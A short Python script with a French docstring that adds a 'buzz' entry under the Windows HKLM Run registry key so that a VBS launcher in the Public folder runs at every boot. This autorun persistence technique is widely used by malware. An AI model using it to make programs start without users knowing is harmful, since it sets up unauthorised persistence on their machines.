import winreg

def boot():
    '''
    Crée une clé de registre pour lancer le programme au demarrage de Windows
    '''
    reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
    key = winreg.CreateKey(reg, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run')
    current_dir = 'C:\\Users\\Public\\build\\exe.win-amd64-3.6\\scripts\\launch_thread.vbs'
    winreg.SetValueEx(key, 'buzz', 0, winreg.REG_SZ, current_dir)
    winreg.CloseKey(reg)

if __name__ == '__main__':
    boot()